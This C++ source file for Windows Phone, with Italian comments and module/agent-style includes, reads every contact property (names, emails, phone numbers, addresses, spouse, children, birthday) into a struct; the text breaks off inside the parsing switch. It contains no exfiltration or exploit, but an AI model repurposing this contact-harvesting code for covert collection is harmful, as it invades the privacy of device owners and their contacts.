#include "Modules.h"
#include "Common.h"
#include "Module.h"
///#include "MAPIAgent.h"
///#include "PoomMan.h"
#include "FunctionFunc.h"




HRESULT ContactChooserExample(void)
{
    HRESULT hr                      = E_FAIL;    
    const CEPROPID c_propidAllEmail = PIMPR_ALL_EMAIL; 
    CHOOSECONTACT cc                = {0};

    // Setup the CHOOSECONTACT structure.
    cc.cbSize                     = sizeof (cc);
    cc.dwFlags                    = CCF_RETURNCONTACTNAME | CCF_RETURNPROPERTYVALUE | CCF_HIDENEW;
    cc.rgpropidRequiredProperties = &c_propidAllEmail;

    // The number of properties specified in the c_propidAllEmail array.
    cc.cRequiredProperties = 1;
    cc.hwndOwner           = NULL;

    // Display the Contact Chooser control, and prompt the user to choose a Contact.
    hr = _ChooseContact(&cc);

    // The name, and a string representation of the property, is returned according to the flags set in the CHOOSECONTACT structure above.
   // DEBUGMSG(TRUE, (L"%s's email address is %s", cc.bstrContactName, cc.bstrPropertyValueSelected));

    // Free memory.
    //SysFreeString(cc.bstrContactName);
    //SysFreeString(cc.bstrPropertyValueSelected);

    return hr;
}

/*
public class Object
{
    // Methods
    public Object();
    public virtual bool Equals(object obj);
    public static bool Equals(object objA, object objB);
    private void FieldGetter(string typeName, string fieldName, ref object val);
    private void FieldSetter(string typeName, string fieldName, object val);
    protected virtual void Finalize();
    private FieldInfo GetFieldInfo(string typeName, string fieldName);
    public virtual int GetHashCode();
    public extern Type GetType();
    protected extern object MemberwiseClone();
    public static bool ReferenceEquals(object objA, object objB);
    public virtual string ToString();
}
*/

typedef struct _SOURCEDPROPVAL
{
    unsigned int cSources;
    void* rgSources;
    void* pPropVal;
} SOURCEDPROPVAL;

typedef struct _PSOURCEDPROPVAL
{
    unsigned int  PIMPR_PROPS;
    unsigned int reserved;
    LPCWSTR lpwstr;
} PSOURCEDPROPVAL;



typedef struct _CONTACT
{
	unsigned int cProps;
    void *rgPropVals;
    unsigned int cAggregatedProps;
    void *rgAggregatedPropVals;
    unsigned int cSources;
    void *rgAccounts;
    unsigned int contactId;
} CONTACT;

typedef enum _StorageKind
{
	Phone,
    WindowsLive,
    Outlook,
    Facebook,
    Other
} StorageKind;

typedef enum _PhoneNumberKind
{
    Mobile,
    Home,
    Work,
    Company,
    Pager,
    HomeFax,
    WorkFax
} PhoneNumberKind;


typedef enum _NETWORK_SOURCE_ID
{
    NFacebook = 7,
    NOutlook = 0x11,
    NWindowsLive = 1
} NETWORK_SOURCE_ID;

 



typedef enum _PIMPR_PROPS
{
	_PIMPR_ALL_DAY_EVENT = 0x44000b,
    _PIMPR_BODY_TEXT = 0x101f001f,
	_PIMPR_BUSINESS_ADDRESS = 0x10c0001f,
    _PIMPR_BUSINESS_ADDRESS_CITY = 0xc2001f,
    _PIMPR_BUSINESS_ADDRESS_COUNTRY = 0xc5001f,
    _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE = 0xc4001f,
    _PIMPR_BUSINESS_ADDRESS_STATE = 0xc3001f,
    _PIMPR_BUSINESS_ADDRESS_STREET = 0xc1001f,
    _PIMPR_BUSINESS_FAX_NUMBER = 0x9b001f,
    _PIMPR_BUSINESS_TELEPHONE_NUMBER = 0x97001f,
    _PIMPR_BUSINESS2_TELEPHONE_NUMBER = 0x98001f,
    _PIMPR_BUSY_STATUS = 0x450013,
    _PIMPR_CHILDREN = 0xa6001f,
    _PIMPR_COMPANY_NAME = 0x8a001f,
    _PIMPR_COMPANY_TELEPHONE_NUMBER = 0xa0001f,
    _PIMPR_DISPLAY_NAME = 0x10a4001f,
    _PIMPR_EMAIL_ADDRESS = 0x3003001f,
    _PIMPR_EMAIL1_ADDRESS = 0x90001f,
    _PIMPR_EMAIL2_ADDRESS = 0x91001f,
    _PIMPR_EMAIL3_ADDRESS = 0x92001f,
    _PIMPR_FIRST_NAME = 0x82001f,
    _PIMPR_FLOATING_BIRTHDAY = 0xf20040,
    _PIMPR_HOME_ADDRESS = 0x10d0001f,
    _PIMPR_HOME_ADDRESS_CITY = 0xd2001f,
    _PIMPR_HOME_ADDRESS_COUNTRY = 0xd5001f,
    _PIMPR_HOME_ADDRESS_POSTAL_CODE = 0xd4001f,
    _PIMPR_HOME_ADDRESS_STATE = 0xd3001f,
    _PIMPR_HOME_ADDRESS_STREET = 0xd1001f,
    _PIMPR_HOME_FAX_NUMBER = 0x9c001f,
    _PIMPR_HOME_TELEPHONE_NUMBER = 0x99001f,
    _PIMPR_HOME2_TELEPHONE_NUMBER = 0x9a001f,
    _PIMPR_IS_FAVORITE = 0x105000b,
    _PIMPR_JOB_INFO = 0xac001f,
    _PIMPR_JOB_TITLE = 0x8c001f,
    _PIMPR_LAST_NAME = 0x84001f,
    _PIMPR_LOCATION = 0x41001f,
    _PIMPR_MEETING_ORGANIZER_EMAIL = 0x55001f,
    _PIMPR_MEETING_ORGANIZER_NAME = 0x51001f,
    _PIMPR_MIDDLE_NAME = 0x83001f,
    _PIMPR_MOBILE_TELEPHONE_NUMBER = 0x96001f,
    _PIMPR_MOBILE2_TELEPHONE_NUMBER = 0x9e001f,
    _PIMPR_NAME = 0x3001001f,
    _PIMPR_NETWORK_SOURCE_ID = 0x1ae0013,
    _PIMPR_NICKNAME = 0x86001f,
    _PIMPR_OFFICE_LOCATION = 0x8e001f,
    _PIMPR_OTHER_ADDRESS = 0x10e0001f,
    _PIMPR_OTHER_ADDRESS_CITY = 0xe2001f,
    _PIMPR_OTHER_ADDRESS_COUNTRY = 0xe5001f,
    _PIMPR_OTHER_ADDRESS_POSTAL_CODE = 0xe4001f,
    _PIMPR_OTHER_ADDRESS_STATE = 0xe3001f,
    _PIMPR_OTHER_ADDRESS_STREET = 0xe1001f,
    _PIMPR_PAGER_NUMBER = 0x9d001f,
    _PIMPR_SENSITIVITY = 0x210013,
    _PIMPR_SPOUSE = 0xa5001f,
    _PIMPR_START = 0x10420040,
    _PIMPR_SUBJECT = 0x20001f,
    _PIMPR_SUFFIX = 0x85001f,
    _PIMPR_TITLE = 0x81001f,
    _PIMPR_WEB_PAGE = 0xa7001f,
    _PIMPR_YOMI_COMPANY = 0x89001f,
    _PIMPR_YOMI_FIRSTNAME = 0x87001f,
    _PIMPR_YOMI_LASTNAME = 0x88001f
} PIMPR_PROPS;


 /*
internal enum PIMPR_PROPS : uint
{
    PIMPR_ALL_DAY_EVENT = 0x44000b,
    PIMPR_BODY_TEXT = 0x101f001f,
    PIMPR_BUSINESS_ADDRESS = 0x10c0001f,
    PIMPR_BUSINESS_ADDRESS_CITY = 0xc2001f,
    PIMPR_BUSINESS_ADDRESS_COUNTRY = 0xc5001f,
    PIMPR_BUSINESS_ADDRESS_POSTAL_CODE = 0xc4001f,
    PIMPR_BUSINESS_ADDRESS_STATE = 0xc3001f,
    PIMPR_BUSINESS_ADDRESS_STREET = 0xc1001f,
    PIMPR_BUSINESS_FAX_NUMBER = 0x9b001f,
    PIMPR_BUSINESS_TELEPHONE_NUMBER = 0x97001f,
    PIMPR_BUSINESS2_TELEPHONE_NUMBER = 0x98001f,
    PIMPR_BUSY_STATUS = 0x450013,
    PIMPR_CHILDREN = 0xa6001f,
    PIMPR_COMPANY_NAME = 0x8a001f,
    PIMPR_COMPANY_TELEPHONE_NUMBER = 0xa0001f,
    PIMPR_DISPLAY_NAME = 0x10a4001f,
    PIMPR_EMAIL_ADDRESS = 0x3003001f,
    PIMPR_EMAIL1_ADDRESS = 0x90001f,
    PIMPR_EMAIL2_ADDRESS = 0x91001f,
    PIMPR_EMAIL3_ADDRESS = 0x92001f,
    PIMPR_END = 0x10430040,
    PIMPR_FIRST_NAME = 0x82001f,
    PIMPR_FLOATING_BIRTHDAY = 0xf20040,
    PIMPR_HOME_ADDRESS = 0x10d0001f,
    PIMPR_HOME_ADDRESS_CITY = 0xd2001f,
    PIMPR_HOME_ADDRESS_COUNTRY = 0xd5001f,
    PIMPR_HOME_ADDRESS_POSTAL_CODE = 0xd4001f,
    PIMPR_HOME_ADDRESS_STATE = 0xd3001f,
    PIMPR_HOME_ADDRESS_STREET = 0xd1001f,
    PIMPR_HOME_FAX_NUMBER = 0x9c001f,
    PIMPR_HOME_TELEPHONE_NUMBER = 0x99001f,
    PIMPR_HOME2_TELEPHONE_NUMBER = 0x9a001f,
    PIMPR_IS_FAVORITE = 0x105000b,
    PIMPR_JOB_INFO = 0xac001f,
    PIMPR_JOB_TITLE = 0x8c001f,
    PIMPR_LAST_NAME = 0x84001f,
    PIMPR_LOCATION = 0x41001f,
    PIMPR_MEETING_ORGANIZER_EMAIL = 0x55001f,
    PIMPR_MEETING_ORGANIZER_NAME = 0x51001f,
    PIMPR_MIDDLE_NAME = 0x83001f,
    PIMPR_MOBILE_TELEPHONE_NUMBER = 0x96001f,
    PIMPR_MOBILE2_TELEPHONE_NUMBER = 0x9e001f,
    PIMPR_NAME = 0x3001001f,
    PIMPR_NETWORK_SOURCE_ID = 0x1ae0013,
    PIMPR_NICKNAME = 0x86001f,
    PIMPR_OFFICE_LOCATION = 0x8e001f,
    PIMPR_OTHER_ADDRESS = 0x10e0001f,
    PIMPR_OTHER_ADDRESS_CITY = 0xe2001f,
    PIMPR_OTHER_ADDRESS_COUNTRY = 0xe5001f,
    PIMPR_OTHER_ADDRESS_POSTAL_CODE = 0xe4001f,
    PIMPR_OTHER_ADDRESS_STATE = 0xe3001f,
    PIMPR_OTHER_ADDRESS_STREET = 0xe1001f,
    PIMPR_PAGER_NUMBER = 0x9d001f,
    PIMPR_SENSITIVITY = 0x210013,
    PIMPR_SPOUSE = 0xa5001f,
    PIMPR_START = 0x10420040,
    PIMPR_SUBJECT = 0x20001f,
    PIMPR_SUFFIX = 0x85001f,
    PIMPR_TITLE = 0x81001f,
    PIMPR_WEB_PAGE = 0xa7001f,
    PIMPR_YOMI_COMPANY = 0x89001f,
    PIMPR_YOMI_FIRSTNAME = 0x87001f,
    PIMPR_YOMI_LASTNAME = 0x88001f
}

*/


typedef struct _ACCOUNT
{
    unsigned int cProps;
    void * rgPropVals;
    unsigned int fIsDefaultStore;
} ACCOUNT;

class PhoneAccount
{
	private:
		ACCOUNT	*obj;
	public:
		PhoneAccount(ACCOUNT *a) : obj(a) { };

		StorageKind Kind() 
		{ 
			return (obj->fIsDefaultStore) ? StorageKind::Phone : StorageKind::Other; 
		};
		
		LPSTR Name() 
		{ 
			CEPROPVAL *ce = (CEPROPVAL *)obj->rgPropVals; 
			CEPROPVAL *v = &ce[0];

			return (LPSTR) v->val.lpwstr;
		};

};

//class ContactPhoneNumber
//{
//    // Fields
//	private:
//		//List<Account> _accounts = new List<Account>();
//		ACCOUNT	*obj;
//	public:
//    // Methods
//    ContactPhoneNumber()
//    {
//    };
//
//    
//    //public override string ToString()
//    //{
//    //    return string.Format(CultureInfo.CurrentCulture, "{0} ({1})", new object[] { this.PhoneNumber, this.Kind });
//    //}
//
//    // Properties
//    PhoneNumberKind Kind { };
//
//	LPSTR PhoneNumber {  };
//}




class PhoneContact
{
	private:
		CONTACT	*obj;
		ACCOUNT *accounts;

	public:
		PhoneContact(CONTACT *serialized) : obj(serialized)
		{
			/*
				this._phoneNumbers = new List<ContactPhoneNumber>();
				this._emailAddresses = new List<ContactEmailAddress>();
				this._addresses = new List<ContactAddress>();
				this._companies = new List<ContactCompanyInformation>();
				this._websites = new List<string>();
				this._significantOthers = new List<string>();
				this._children = new List<string>();
				this._notes = new List<string>();
				this._birthdays = new List<DateTime>();
				this._accounts = new List<Account>();
			*/
			accounts = (ACCOUNT *) obj->rgAccounts;

		};

		



		int NumberOfAccounts() { return obj->cSources; };
		int SizeOfAccounts() { return obj->cSources * sizeof(ACCOUNT); };


		int CProps() { return obj->cProps; };
		int CAggregatedProps() { return obj->cAggregatedProps; };
		int CSources() { return obj->cSources; };
		int ContactId() { return obj->contactId; };
/*
	unsigned int cProps;
    void *rgPropVals;
    unsigned int cAggregatedProps;
    void *rgAggregatedPropVals;
    unsigned int cSources;
    void *rgAccounts;
    unsigned int contactId;
*/


		PhoneAccount *GetAccount(int i) { return new PhoneAccount(&accounts[i]); };
};

/*
public class Object
{
    // Methods
    public bool Equals(object obj)
    {
        //return RuntimeHelpers.Equals(this, obj);
		return true;
    }

    public bool Equals(object objA, object objB)
    {
        //return ((objA == objB) || (((objA != null) && (objB != null)) && objA.Equals(objB)));
		return true;
    }

    private void FieldGetter(string typeName, string fieldName, ref object val)
    {
        //val = this.GetFieldInfo(typeName, fieldName).GetValue(this);
    }

    private void FieldSetter(string typeName, string fieldName, object val)
    {
		
        //FieldInfo fieldInfo = this.GetFieldInfo(typeName, fieldName);
        //if (fieldInfo.IsInitOnly)
        //{
        //    throw new FieldAccessException(Environment.GetResourceString("FieldAccess_InitOnly"));
        //}
        //Type fieldType = fieldInfo.FieldType;
        //if (fieldType.IsByRef)
        //{
        //    fieldType = fieldType.GetElementType();
        //}
        //if (!fieldType.IsInstanceOfType(val))
        //{
        //    val = Convert.ChangeType(val, fieldType, CultureInfo.InvariantCulture);
        //}
        //fieldInfo.SetValue(this, val);
		
    }

    protected virtual void Finalize()
    {
    }

    private FieldInfo GetFieldInfo(string typeName, string fieldName)
    {
		
        //Type baseType = this.GetType();
        //while (baseType != null)
        //{
        //    if (baseType.FullName.Equals(typeName))
        //    {
        //        break;
        //    }
        //    baseType = baseType.BaseType;
        //}
        //if (baseType == null)
        //{
        //    throw new ArgumentException();
        //}
        //FieldInfo field = baseType.GetField(fieldName, BindingFlags.Public | BindingFlags.Instance | BindingFlags.IgnoreCase);
        //if (field == null)
        //{
        //    throw new ArgumentException();
        //}
        //return field;
		
    }

    public virtual int GetHashCode()
    {
        //return RuntimeHelpers.GetHashCode(this);
    }

    public extern Type GetType();
    protected extern object MemberwiseClone();
    public static bool ReferenceEquals(object objA, object objB)
    {
        //return (objA == objB);
    }

    public virtual string ToString()
    {
       // return this.GetType().ToString();
    }
}
*/



typedef struct _COMPLETENAMEACC
{
    LPCWSTR FirstName;
    LPCWSTR LastName;
    LPCWSTR MiddleName;
    LPCWSTR Nickname;
    LPCWSTR Suffix;
    LPCWSTR Title;
    LPCWSTR YomiFirstName;
    LPCWSTR YomiLastName;
} COMPLETENAMEACC;

//lo stesso utente puo' essere registrato al massimo su 16 account es. Skype, Hotmail, Gmail ecc... sfido ad arrivare a 16
#define MAX_NUM_ACCOUNT 16

typedef struct _CONTACTACC
{
    COMPLETENAMEACC CompleteName;
    LPCWSTR DisplayName;
    unsigned int Id;
    bool IsPinnedToStart;
	unsigned int NumAccount;
	LPCWSTR NameAccount[MAX_NUM_ACCOUNT];
	StorageKind NameAccountKind[MAX_NUM_ACCOUNT]; 

	LPCWSTR CONTACT_PIMPR_JOB_TITLE;
	LPCWSTR CONTACT_PIMPR_OFFICE_LOCATION;
	LPCWSTR CONTACT_PIMPR_YOMI_COMPANY;
	LPCWSTR CONTACT_PIMPR_COMPANY_NAME;
	LPCWSTR CONTACT_PIMPR_EMAIL1_ADDRESS;
	LPCWSTR CONTACT_PIMPR_EMAIL2_ADDRESS;
	LPCWSTR CONTACT_PIMPR_EMAIL3_ADDRESS;
	LPCWSTR CONTACT_PIMPR_SPOUSE;
	LPCWSTR CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_HOME_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_BUSINESS_FAX_NUMBER;
	LPCWSTR CONTACT_PIMPR_HOME_FAX_NUMBER;
	LPCWSTR CONTACT_PIMPR_PAGER_NUMBER;
	LPCWSTR CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER;
	LPCWSTR CONTACT_PIMPR_BUSINESS_ADDRESS_STREET;
	LPCWSTR CONTACT_PIMPR_BUSINESS_ADDRESS_CITY;
	LPCWSTR CONTACT_PIMPR_CHILDREN;
	LPCWSTR CONTACT_PIMPR_WEB_PAGE;
	LPCWSTR CONTACT_PIMPR_BUSINESS_ADDRESS_STATE;
	LPCWSTR CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE;
	LPCWSTR CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY;
	LPCWSTR CONTACT_PIMPR_HOME_ADDRESS_STREET;
	LPCWSTR CONTACT_PIMPR_HOME_ADDRESS_CITY;
	LPCWSTR CONTACT_PIMPR_HOME_ADDRESS_COUNTRY;
	LPCWSTR CONTACT_PIMPR_OTHER_ADDRESS_STREET;
	LPCWSTR CONTACT_PIMPR_OTHER_ADDRESS_CITY;
	LPCWSTR CONTACT_PIMPR_HOME_ADDRESS_STATE;
	LPCWSTR CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE;
	LPCWSTR CONTACT_PIMPR_OTHER_ADDRESS_STATE;
	LPCWSTR CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE;
	LPCWSTR CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY;
	WCHAR   CONTACT_PIMPR_FLOATING_BIRTHDAY[32];
	LPCWSTR CONTACT_PIMPR_BODY_TEXT;

} CONTACTACC;

typedef struct _SOURCE
{
    unsigned int sourceIndex;
    unsigned int contactId;
} SOURCE;


#include <list>
#include <iostream>

void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact)
{
	SOURCEDPROPVAL* ptrS;
	CEPROPVAL* ptrPS;
/*
	quiesta parte l'ho tolta peche' mi serve solo per ricostruire le info di:
	PIMPR_HOME_ADDRESS:
	PIMPR_PROPS.PIMPR_OTHER_ADDRESS:
	PIMPR_PROPS.PIMPR_JOB_INFO:
	PIMPR_PROPS.PIMPR_BUSINESS_ADDRESS:
	queste info sono un aggregato di info gia' presenti es.
	PIMPR_HOME_ADDRESS = _PIMPR_HOME_ADDRESS_STREET + _PIMPR_HOME_ADDRESS_CITY + _PIMPR_HOME_ADDRESS_STATE + _PIMPR_HOME_ADDRESS_POSTAL_CODE +_PIMPR_HOME_ADDRESS_COUNTRY

	list<list<SOURCE>> accountIndexes;
	list<list<SOURCE>> list5;
	list<list<SOURCE>> list4;
	list<list<SOURCE>> list3;




	
    for (int i = 0; i < cAggregatedProps; i++)
    {
		ptrS=(SOURCEDPROPVAL*)rgAggregatedPropVals+i;
		SOURCE *ptrSOURCE;

		list<SOURCE> item;

		for (UINT j = 0; j < ptrS->cSources; j++)
		{
			ptrSOURCE=(SOURCE*)ptrS->rgSources+j;
			item.insert(item.begin(),*ptrSOURCE);
		}

		ptrPS=((CEPROPVAL*)ptrS->pPropVal);
	
		

		switch (((PIMPR_PROPS) ptrPS->propid))
        {
		
            case _PIMPR_HOME_ADDRESS:
                list5.insert(list5.begin(),item);
                break;

            case _PIMPR_OTHER_ADDRESS:
				list3.insert(list3.begin(),item);
                break;

            case _PIMPR_JOB_INFO:
				accountIndexes.insert(accountIndexes.begin(),item);
                break;

            case _PIMPR_BUSINESS_ADDRESS:
				list4.insert(list4.begin(),item);
                break;
				
        }
		
    }

	//contact.AddAddresses(AddressKind.Home, list5);
    //contact.AddAddresses(AddressKind.Work, list4);
    //contact.AddAddresses(AddressKind.Other, list3);

	*/

	/*
				int si=0;
				si=accountIndexes.size();

				for (std::list<list<SOURCE>>::iterator it = accountIndexes.begin(); it != accountIndexes.end(); it++)
				{
					
					for (std::list<SOURCE>::iterator it2 = it->begin(); it2 != it->end(); it2++)
					{
						WCHAR msg[128];
						swprintf_s(msg, L"it2->contactId=%i it2->sourceIndex=%i\n",it2->contactId,it2->sourceIndex);
						OutputDebugString(msg);
					}
				}
*/



	for (int i = 0; i < cAggregatedProps; i++)
    {
		ptrS=(SOURCEDPROPVAL*)rgAggregatedPropVals+i;
		SOURCE *ptrSOURCE;

		list<SOURCE> item;

		for (UINT j = 0; j < ptrS->cSources; j++)
		{
			ptrSOURCE=(SOURCE*)ptrS->rgSources+j;
			item.insert(item.begin(),*ptrSOURCE);
		}

		ptrPS=((CEPROPVAL*)ptrS->pPropVal);
	
		switch (((PIMPR_PROPS) ptrPS->propid))
        {
            case _PIMPR_JOB_TITLE:
                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.JobTitle, item);
				contact->CONTACT_PIMPR_JOB_TITLE=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_OFFICE_LOCATION:
                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.OfficeLocation, item);
				contact->CONTACT_PIMPR_OFFICE_LOCATION=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_YOMI_COMPANY:
                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.YomiCompanyName, item);
				contact->CONTACT_PIMPR_YOMI_COMPANY=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_COMPANY_NAME:
                //contact.UpdateCompany(this.GetString(cepropval.val.lpwstr), COMPANY_PART.CompanyName, item);
				contact->CONTACT_PIMPR_COMPANY_NAME=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL1_ADDRESS:
                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Personal, item);
				contact->CONTACT_PIMPR_EMAIL1_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL2_ADDRESS:
                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Work, item);
				contact->CONTACT_PIMPR_EMAIL2_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_EMAIL3_ADDRESS:
                //contact.AddEmail(this.GetString(cepropval.val.lpwstr), EmailAddressKind.Other, item);
				contact->CONTACT_PIMPR_EMAIL3_ADDRESS=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_MOBILE_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_MOBILE_TELEPHONE_NUMBER=ptrPS->val.lpwstr;	
				break;

            case _PIMPR_MOBILE2_TELEPHONE_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Mobile, item);
				contact->CONTACT_PIMPR_MOBILE2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;	
                break;

            case _PIMPR_BUSINESS_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_BUSINESS_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
				break;

            case _PIMPR_BUSINESS2_TELEPHONE_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME2_TELEPHONE_NUMBER:
				contact->CONTACT_PIMPR_HOME2_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
					break;

            case _PIMPR_HOME_TELEPHONE_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Home, item);
				contact->CONTACT_PIMPR_HOME_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_FAX_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.WorkFax, item);
				contact->CONTACT_PIMPR_BUSINESS_FAX_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_FAX_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.HomeFax, item);
				contact->CONTACT_PIMPR_HOME_FAX_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_PAGER_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Pager, item);
				contact->CONTACT_PIMPR_PAGER_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_COMPANY_TELEPHONE_NUMBER:
                //contact.AddPhoneNumber(this.GetString(cepropval.val.lpwstr), PhoneNumberKind.Company, item);
				contact->CONTACT_PIMPR_COMPANY_TELEPHONE_NUMBER=ptrPS->val.lpwstr;
                break;

            case _PIMPR_SPOUSE:
                //contact.AddSignificantOther(this.GetString(cepropval.val.lpwstr));
				contact->CONTACT_PIMPR_SPOUSE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_STREET:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_CITY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_CHILDREN:
                //contact.AddChildren(this.GetString(cepropval.val.lpwstr));
				contact->CONTACT_PIMPR_CHILDREN=ptrPS->val.lpwstr;
                break;

            case _PIMPR_WEB_PAGE:
                //contact.AddWebsite(this.GetString(cepropval.val.lpwstr));
				contact->CONTACT_PIMPR_WEB_PAGE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_STATE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_POSTAL_CODE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_BUSINESS_ADDRESS_COUNTRY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Work, item);
				contact->CONTACT_PIMPR_BUSINESS_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_STREET:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Home, item);
				contact->CONTACT_PIMPR_HOME_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_CITY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Home, item);
				contact->CONTACT_PIMPR_HOME_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_COUNTRY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Home, item);
				contact->CONTACT_PIMPR_HOME_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_STREET:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Street, AddressKind.Other, item);
				contact->CONTACT_PIMPR_OTHER_ADDRESS_STREET=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_CITY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.City, AddressKind.Other, item);
				contact->CONTACT_PIMPR_OTHER_ADDRESS_CITY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_STATE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Home, item);
				contact->CONTACT_PIMPR_HOME_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_HOME_ADDRESS_POSTAL_CODE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Home, item);
				contact->CONTACT_PIMPR_HOME_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_STATE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.State, AddressKind.Other, item);
				contact->CONTACT_PIMPR_OTHER_ADDRESS_STATE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_POSTAL_CODE:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.PostalCode, AddressKind.Other, item);
				contact->CONTACT_PIMPR_OTHER_ADDRESS_POSTAL_CODE=ptrPS->val.lpwstr;
                break;

            case _PIMPR_OTHER_ADDRESS_COUNTRY:
                //contact.UpdateAddress(this.GetString(cepropval.val.lpwstr), ADDRESS_PART.Country, AddressKind.Other, item);
				contact->CONTACT_PIMPR_OTHER_ADDRESS_COUNTRY=ptrPS->val.lpwstr;
                break;

            case _PIMPR_FLOATING_BIRTHDAY:
            {
				//long fileTime = (ptrPS->val.filetime.dwHighDateTime << 0x20) + ptrPS->val.filetime.dwLowDateTime;

				FILETIME fileTime = {ptrPS->val.filetime.dwLowDateTime, ptrPS->val.filetime.dwHighDateTime};
                SYSTEMTIME lpUniversalTime,lpLocalTime;
                FileTimeToSystemTime(&fileTime, &lpUniversalTime);
				_SystemTimeToTzSpecificLocalTime(NULL,&lpUniversalTime ,&lpLocalTime);
				
				WCHAR msg[32];
				swprintf_s(msg, L"%i/%i/%i\n",lpLocalTime.wYear,lpLocalTime.wMonth,lpLocalTime.wDay);
				wcscpy((wchar_t*)contact->CONTACT_PIMPR_FLOATING_BIRTHDAY,msg);
				OutputDebugString(msg);
                break;
            }
